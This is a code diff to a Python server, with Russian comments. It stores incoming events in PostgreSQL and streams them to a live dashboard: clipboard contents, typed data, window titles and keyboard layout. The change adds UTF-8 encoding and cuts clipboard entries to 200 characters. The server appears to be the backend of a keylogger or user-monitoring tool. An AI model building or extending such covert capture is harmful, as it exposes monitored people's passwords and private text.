@@ -14,8 +14,10 @@ DATABASE_URL = os.environ.get("DATABASE_URL")
 def get_db_connection():
     if not DATABASE_URL:
         raise Exception("DATABASE_URL is missing")
-    # psycopg2 сам разбирает URL и сам делает SSL
-    return psycopg2.connect(DATABASE_URL)
+    conn = psycopg2.connect(DATABASE_URL)
+    # ПРИНУДИТЕЛЬНО ВКЛЮЧАЕМ UTF-8, ЧТОБЫ РУССКИЙ ТЕКСТ ЧИТАЛСЯ
+    conn.set_client_encoding('UTF8') 
+    return conn
 
 def init_db():
     try:
@@ -57,16 +59,21 @@ def log():
         c = conn.cursor()
 
         for ev in events:
+            # ОГРАНИЧИВАЕМ РАЗМЕР БУФЕРА ОБМЕНА, ЧТОБЫ НЕ ЗАБИВАТЬ БАЗУ КОДОМ
+            data_content = ev.get("data", "")
+            if ev.get("type") == "clipboard" and len(data_content) > 200:
+                data_content = data_content[:200] + "... [ОБРЕЗАНО]"
+
             c.execute('''INSERT INTO logs (event_id, timestamp, type, data, win_title, layout) 
                          VALUES (%s, %s, %s, %s, %s, %s) 
                          ON CONFLICT (event_id) DO NOTHING''', 
-                      (event_id, timestamp, ev.get("type"), ev.get("data"), 
+                      (event_id, timestamp, ev.get("type"), data_content, 
                        ev.get("window"), ev.get("layout")))
             
             socketio.emit('new_log', {
                 'time': datetime.now().strftime("%H:%M:%S"),
                 'type': ev.get("type"),
-                'data': ev.get("data"),
+                'data': data_content,
                 'window': ev.get("window")
             })
 
